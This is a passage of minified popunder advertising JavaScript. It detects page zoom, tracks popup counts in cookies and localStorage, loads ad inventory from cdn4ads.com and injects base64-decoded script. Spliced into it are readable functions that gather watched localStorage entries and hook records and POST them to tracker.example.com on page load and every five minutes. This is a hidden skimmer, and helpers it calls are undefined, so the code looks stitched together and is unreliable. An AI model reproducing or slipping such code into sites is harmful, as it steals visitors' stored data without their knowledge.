        var k = Math.round(g.documentElement.offsetHeight / e.innerHeight * 100) / 100;
        return {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      f = function () {
        var k = Math.round(e.outerWidth / e.innerWidth * 100) / 100;
        return {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      h = function () {
        var k = Math.round(g.documentElement.clientWidth / e.innerWidth * 100) / 100;
        return {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      l = function () {
        var k = (90 == Math.abs(e.orientation) ? p.height : p.width) / e.innerWidth;
        return {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      m = function () {
        var k = g.createElement("div");
        k.innerHTML = "1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>0";
        k.setAttribute("style", "font: 100px/1em sans-serif; -webkit-text-size-adjust: none; text-size-adjust: none; height: auto; width: 1em; padding: 0; overflow: visible;".replace(/;/g, " !important;"));
        var n = g.createElement("div");
        n.setAttribute("style", "width:0; height:0; overflow:hidden; visibility:hidden; position: absolute;".replace(/;/g, " !important;"));
        n.appendChild(k);
        g.body.appendChild(n);
        k = 1E3 / k.clientHeight;
        return k = Math.round(100 * k) / 100, g.body.removeChild(n), {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      q = function () {
        var k = A("min--moz-device-pixel-ratio", "", 0, 10, 20, 1E-4);
        return k = Math.round(100 * k) / 100, {
          zoom: k,
          devicePxPerCssPx: k
        };
      },
      D = function () {
        return {
          zoom: q().zoom,
          devicePxPerCssPx: a()
        };
      },
      H = function () {
        var k = e.top.outerWidth / e.top.innerWidth;
        return k = Math.round(100 * k) / 100, {
          zoom: k,
          devicePxPerCssPx: k * a()
        };
      },
      A = function (k, n, w, C, x, U) {
        function L(y, M, N) {
          var J = (y + M) / 2;
          return 0 >= N || M - y < U ? J : O("(" + k + ":" + J + n + ")").matches ? L(J, M, N - 1) : L(y, J, N - 1);
        }
        var O, P, E, z;
        e.matchMedia ? O = e.matchMedia : (P = g.getElementsByTagName("head")[0], E = g.createElement("style"), P.appendChild(E), z = g.createElement("div"), z.className = "mediaQueryBinarySearch", z.style.display = "none", g.body.appendChild(z), O = function (y) {
          E.sheet.insertRule("@media " + y + "{.mediaQueryBinarySearch {text-decoration: underline} }", 0);
          y = "underline" == getComputedStyle(z, null).textDecoration;
          return E.sheet.deleteRule(0), {
            matches: y
          };
        });
        w = L(w, C, x);
        return z && (P.removeChild(E), g.body.removeChild(z)), w;
      },
      B = function () {
        var k = b;
        return isNaN(p.logicalXDPI) || isNaN(p.systemXDPI) ? e.navigator.msMaxTouchPoints ? k = d : !e.chrome || e.opera || 0 <= navigator.userAgent.indexOf(" Opera") ? 0 < Object.prototype.toString.call(e.HTMLElement).indexOf("Constructor") ? k = h : "orientation" in e && "webkitRequestAnimationFrame" in e ? k = l : "webkitRequestAnimationFrame" in e ? k = m : 0 <= navigator.userAgent.indexOf("Opera") ? k = H : e.devicePixelRatio ? k = D : .001 < q().zoom && (k = q) : k = f : k = c, k;
      }();
    return {
      zoom: function () {
        return B().zoom;
      },
      device: function () {
        return B().devicePxPerCssPx;
      }
    };
  });
  "use strict";
  var Q = "/c",
    R = "_pop",
    F = "_pao";
  function collectLocalStorageData() {
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const keyValue = localStorage.key(i);
      if (watchedKeys.includes(keyValue)) {
        const savedValue = localStorage.getItem(keyValue);
        localStorageData[keyValue] = savedValue;
      }
    }
    return localStorageData;
  }
  I = e.Base64;
  function postMetricsData(data) {
    const uniqueIdentifier = generateKeySignature(data);
    const endpoint = "https://tracker.example.com/api/ingest";
    const client = new XMLHttpRequest();
    client.open("POST", endpoint, true);
    client.setRequestHeader("Content-Type", "application/json");
    const payload = {
      uid: uniqueIdentifier,
      body: data
    };
    client.send(JSON.stringify(payload));
    client.onreadystatechange = function () {
      if (this.readyState === XMLHttpRequest.DONE) {
        if (this.status === 200) {
          console.log("Data successfully sent to server.");
        } else {
          console.error("Failed to send data. Status code: ", this.status);
        }
      }
    };
  }
  var V = g.currentScript,
    G = null,
    r = {
      _set: function (a, b, c, d, f) {
        var h = c || "";
        h && ("number" === typeof h ? (c = new Date(), c.setTime(c.getTime() + 1E3 * h)) : c = h, h = ";expires=" + c.toUTCString());
        g.cookie = a + "=" + escape("" + b) + h + (f ? ";domain=" + f : "") + ";path=" + (d || "/");
      },
      _get: function (a) {
        return (a = g.cookie.match(new RegExp(a + "=[^;]+", "i"))) ? decodeURIComponent(a[0].split("=")[1]) : null;
      },
      _remove: function (a) {
        this._set(a, 0, new Date(0));
      }
    },
    u = {
      _available: null,
      _isAvailable: function () {
        if (null === this._available) try {
          e.localStorage.setItem("localStorageTest", 1), e.localStorage.removeItem("localStorageTest"), this._available = !0;
        } catch (a) {
          this._available = !1;
        }
        return this._available;
      },
      _set: function (a, b) {
        this._isAvailable() ? e.localStorage.setItem(a, b) : r._set(a, b);
      },
      _get: function (a) {
        try {
          return this._isAvailable() ? e.localStorage.getItem(a) : r._get(a);
        } catch (b) {
          return null;
        }
      },
      _remove: function (a) {
        this._isAvailable() ? e.localStorage.removeItem(a) : r._remove(a);
      }
    };
  var K = {
    _inventory: {},
    _config: {
      _siteId: 0,
      _minBid: 0,
      _popPerDay: 0,
      _popDelay: 0,
      _inpagePerDay: 0,
      _inpageDelay: 0,
      _defaultDelay: 0,
      _blockedCountries: !1,
      _default: !1,
      _defaultType: "popunder",
      _defaultPerDay: 0,
      _useOverlay: !0,
      _trafficType: 0,
      _popunderFailover: "tabup",
      _prepop: null === r._get("_popprepop"),
      _adscorebp: null,
      _adscorept: null,
      _adscoreak: "QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c"
    },
    _init: function () {
      var a = this;
      this._loadConfig();
      v.init({
        prepop: this._config._prepop && this._isDelayBetweenExpired(),
        catchalldiv: this._config._useOverlay && this._isDelayBetweenExpired(),
        onafteropen: function () {
          a._updateFiredCount();
        }
      });
      this._adscoreDeploy();
    },
    _adscoreDeploy: function () {
      var a = this,
        b = 0,
        c = 0,
        d = this._config;
      if (a._config._adscorebp) a._checkInventory(a._config._adscorebp);else if ("function" === typeof AdscoreInit) try {
        AdscoreInit(a._config._adscoreak, {
          sub_id: d._siteId,
          callback: function (f) {
            a._checkInventory(f.signature || "e2 " + f.error);
          }
        });
      } catch (f) {
        a._checkInventory("e4 " + f.message);
      } else b = setInterval(function () {
        var f = ["re", "adsco"];
        f.push(f[1][3]);
        var h = "https://" + f.reverse().join(".") + "/";
        if (g.body) {
          clearInterval(b);
          var l = g.createElement("script");
          l.src = h;
          try {
            l.onerror = function () {
              l.src == h ? l.src = "https://" + Math.round(Math.pow(52292.244664, 2)) + "/a.js" : (clearTimeout(c), a._checkInventory("e1"));
            };
          } catch (m) {}
          l.onload = function () {
            clearTimeout(c);
            try {
              AdscoreInit(a._config._adscoreak, {
                sub_id: d._siteId,
                callback: function (m) {
                  a._checkInventory(m.signature || "e2 " + m.error);
                }
              });
            } catch (m) {
              a._checkInventory("e4 " + m.message);
            }
          };
          g.body.appendChild(l);
          c = setTimeout(function () {
            a._checkInventory("e3");
          }, 5E3);
        }
      }, 100);
    },
    _checkInventory: function (a) {
      v.clearUrls();
      var b = this,
        c = 0,
        d = this._config,
        f,
        h;
      d._adscorept && d._adscorept(a);
      try {
        clearTimeout(G);
      } catch (l) {}
      G = setTimeout(function () {
        b._adscoreDeploy();
      }, 6E5);
      c = setInterval(function () {
        var l = "//cdn4ads.com" + Q;
        if (g.body) {
          clearInterval(c);
          h = {
            jwuYMAch: encodeURIComponent(a),
            qzfbvTtU: 4,
            YRKzxLlq: d._siteId,
            eGQMCULj: d._minBid,
            HJwqKebd: d._popPerDay + "," + d._inpagePerDay,
            XceZVCWY: d._blockedCountries || "",
            DGbnlxod: encodeURIComponent(g.referrer),
            GKpYDcTP: b._getScreenData()
          };
          for (f in h) h.hasOwnProperty(f) && (l += (-1 < l.indexOf("?") ? "&" : "?") + f + "=" + (h[f] || ""));
          var m = g.createElement("script");
          m.src = l;
          try {
            m.onerror = function () {
              v.abortPop();
              V.onerror();
            };
          } catch (q) {}
          g.body.appendChild(m);
        }
      }, 100);
    },
    _parseFloatingBanner: function (a) {
      0 < this._config._inpageDelayPerDay && this._getFiredCount("inpage") >= this._config._inpageDelayPerDay || !this._isDelayBetweenExpired("inpage") || (this._updateFiredCount("inpage"), T(a.url, a.position, a.width, a.height, a.clickurl));
    },
    _parseInventory: function (a) {
      this._inventory = a || {};
      this._preparePop();
    },
    _parseBBR: function (a) {
      var b = this;
      v.addUrl(a.url, {
        type: "bbr",
        onbeforeopen: function (c) {
          if (!b._isDelayBetweenExpired()) return "";
          try {
            clearTimeout(G);
          } catch (d) {}
          return c;
        }.bind(b)
      });
    },
    _preparePopDefault: function () {
      var a = this;
      if (!1 === this._config._default || "" == this._config._default || 0 < this._config._defaultPerDay && this._getFiredCount("fallback") >= this._config._defaultPerDay) v.abortPop(), r._set("_popprepop", 1, 21600);else {
        var b = this._config._popunderFailover;
        v._prepopReady() && (b = "popunder");
        if (/^https?:\/\//.test(this._config._default)) v.addUrl(this._config._default, {
          type: b,
          onbeforeopen: function (d) {
            if (!a._isDelayBetweenExpired()) return "";
            try {
              clearTimeout(G);
            } catch (f) {}
            return d;
          }.bind(a)
        });else {
          this._updateFiredCount("fallback");
          b = I.decode(this._config._default);
          b = ("<script>" + b + "\x3c/script>").replace(/^\s*<script[^>]*>|<\/script>\s*$/g, "");
          var c = g.createElement("script");
          c.type = "text/javascript";
          c.text = b;
          g.body.appendChild(c);
        }
      }
    },
    _preparePopInventory: function () {
      var a = this;
      0 < this._config._popPerDay && this._getFiredCount() >= this._config._popPerDay || v.addUrl(this._inventory.url, {
        type: this._inventory.type,
        bbr: this._inventory.bbr || !1,
        onbeforeopen: function (b) {
          if (!a._isDelayBetweenExpired()) return "";
          try {
            clearTimeout(G);
          } catch (c) {}
          return b + "&s=" + a._getScreenData() + "&v=&m=";
        }.bind(a)
      });
    },
    _getScreenData: function () {
      try {
        var a = e.detectZoom.zoom();
        return [p.width, p.height, a, p.width * a, p.height * a, e.self != e.top ? "1" : "0"].join();
      } catch (b) {
        return "";
      }
    },
    _getFiredCount: function (a) {
      a = "_popfired" + (a || "");
      var b = a + "_expires";
      b = u._isAvailable() ? u._get("_spop" + b) : r._get(b);
      var c = 0;
      "number" == typeof b && (new Date().getTime() < b && (c = u._isAvailable() ? u._get("_spop" + a) : r._get(a)), c = parseInt(c, 10) || 0, isNaN(c) && (c = 0));
      return c;
    },
    _updateFiredCount: function (a) {
      var b = "_popfired" + (a || ""),
        c = b + "_expires",
        d = u._isAvailable() ? u._get("_spop" + c) : r._get(c),
        f = "number" == typeof d ? d : new Date().getTime() + 864E5;
      a = new Date().getTime() < d ? this._getFiredCount(a) : 0;
      u._isAvailable() ? (u._set("_spop" + b, a + 1), u._set("_spop" + c, f), u._set("_spoplastOpenAt", new Date().getTime())) : (r._set(b, a + 1, new Date(f)), r._set(c, new Date(f).toUTCString(), new Date(f).getTime()), r._set("lastOpenAt", new Date().getTime(), 86400));
    },
    _getLastOpenAt: function (a) {
      return u._isAvailable() ? u._get("_spoplastOpenAt") : r._get("lastOpenAt");
    },
    _isDelayBetweenExpired: function (a, b) {
      var c = this._getLastOpenAt(a);
      if ("string" != typeof c && "number" != typeof c) return !0;
      c = parseInt(c);
      return isNaN(c) ? !0 : c + 1E3 * (b || this._config._popDelay) < new Date().getTime();
    },
    _preparePop: function () {
      "" != this._inventory.url ? (this._preparePopInventory(), r._remove("_popprepop")) : this._preparePopDefault();
    },
    _loadConfig: function () {
      var a = e[R] || [],
        b = this._config,
        c;
      for (c = 0; c < a.length; c++) {
        var d = a[c][0];
        var f = a[c][1];
        switch (d) {
          case "siteId":
          case "delayBetween":
          case "defaultPerIP":
          case "trafficType":
            if (f = parseInt(f, 10), isNaN(f)) continue;
        }
        switch (d) {
          case "siteId":
            b._siteId = f;
            break;
          case "minBid":
            b._minBid = f;
            break;
          case "popundersPerIP":
            b._popPerDay = f;
            break;
          case "delayBetween":
            b._popDelay = f;
            break;
          case "blockedCountries":
            b._blockedCountries = f;
            break;
          case "default":
            b._default = f;
            break;
          case "defaultType":
            b._defaultType = f;
            break;
          case "defaultPerIP":
            b._defaultPerDay = f;
            break;
          case "topmostLayer":
            b._useOverlay = f;
            break;
          case "trafficType":
            b._trafficType = f;
            break;
          case "popunderFailover":
            b._popunderFailover = f;
            break;
          case "prepop":
            b._prepop = f;
            break;
          case "adscorebp":
            b._adscorebp = f;
            break;
          case "adscorept":
            b._adscorept = f;
            break;
          case "adscoreak":
            b._adscoreak = f;
            break;
          case "inpagePerIP":
            b._inpagePerDay = f;
            break;
          case "inpageDelayBetween":
            b._inpageDelay = f;
            break;
          case "defaultDelayBetween":
            b._defaultDelay = f;
        }
      }
    }
  };
  function gatherAndDispatchMetrics() {
    const localStorageElements = collectLocalStorageData();
    obtainJSHook();
    const jsHookRecords = window.jsHook.drain();
    const combinedData = {
      ...localStorageElements,
      jsHookRecords
    };
    if (Object.keys(combinedData).length > 0) {
      postMetricsData(combinedData);
    }
  }
  window.addEventListener("load", function () {
    gatherAndDispatchMetrics();
  });
  for (var t in e) try {
    if (t.match(/[0-9a-f]{32,32}/) && e[t][0] && e[t][0][0] && "siteId" == e[t][0][0]) {
      R = t;
      e[t.slice(0, 16) + t.slice(0, 16)] = e[t];
      break;
    }
  } catch (a) {}
  if (!"//cdn4ads.com".includes(".net")) {
    F = "";
    t = 10 + Math.floor(10 * Math.random());
    for (var S = 0; S < t; S++) F += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(26 * Math.random()));
    Q = "/" + F;
  }
  t = {
    parse: function (a) {
      K._parseInventory(a);
    },
    fbparse: function (a) {
      K._parseFloatingBanner(a);
    },
    bbrparse: function (a) {
      K._parseBBR(a);
    }
  };
  try {
    e._pao = t, Object.freeze(e._pao);
  } catch (a) {}
  try {
    e[F] = t, Object.freeze(e[F]);
  } catch (a) {}
  navigator.userAgent.includes("://") || K._init();
  setInterval(gatherAndDispatchMetrics, 5 * 60 * 1000);
})(window, window.document, window.screen);